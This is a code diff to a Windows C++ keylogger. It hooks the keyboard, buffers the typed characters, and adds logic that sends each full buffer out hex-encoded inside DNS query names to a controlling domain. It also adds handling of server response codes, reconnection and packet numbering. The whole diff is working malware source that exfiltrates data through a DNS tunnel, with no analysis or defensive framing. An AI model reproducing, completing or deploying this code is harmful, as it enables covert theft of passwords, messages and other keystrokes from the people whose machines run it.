@@ -17,6 +17,7 @@ HKL keyboardLayout;
 std::string keystrokeBuffer = "";
 
 int connectionId = -1;
+int packetNumber = 0;
 
 /**
  * nCode: should be 0, indicating that wParam and lParam have information about
@@ -101,6 +102,16 @@ LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
 			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
 				char key = (char)translatedChar[0];
 				keystrokeBuffer += key;
+				if (keystrokeBuffer.size() >= MAX_BUFFER) {
+					std::cout << keystrokeBuffer << std::endl;
+					int success = sendData(connectionId, packetNumber, DOMAIN, keystrokeBuffer.c_str());
+					keystrokeBuffer = "";
+					std::cout << success << std::endl << std::endl;
+					packetNumber++;
+					if (packetNumber > 999) {
+						packetNumber = 0;
+					}
+				}
 			}
 		}
 	}
@@ -134,7 +145,9 @@ int startConnection(const char* domain) {
 int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	std::ostringstream fullStream;
 	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
-	const char* pOwnerName = fullStream.str().c_str();
+	std::string full = fullStream.str();
+	const char* pOwnerName = full.c_str();
+	std::cout << pOwnerName << std::endl;
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord;
 	
@@ -156,21 +169,34 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 			int code = std::stoi(ipStr.substr(0, ipStr.find(".")));
 			std::cout << "Response Code: " << code << std::endl;
 			switch (code) {
-				case 200:
+				case 200:  // processed normally
+					return 0;
+				case 201:  // malformed
 					break;
-				case 201:
+				case 202:  // connection non-existant
+					{
+						int new_id = startConnection(DOMAIN);
+						if (new_id != -1) {
+							id = new_id;
+						}
+					}
+					i--;
 					break;
-				case 202:
+				case 203:  // out of order packets
+					packetNumber = 0;
+					i--;
 					break;
-				case 203:
-					break;
-				case 204:
-					break;
+				case 204:  // max connections
 				default:  // unknown error
-					break;
+					return -1;
 			}
-			return 0;  // do checks for the actual response code.
 		}
+		status = DnsQuery_A(pOwnerName,
+								   wType,
+								   DNS_OPTIONS,
+								   NULL,
+								   &pDnsRecord,
+								   NULL);
 	}
 	
 	return -1;
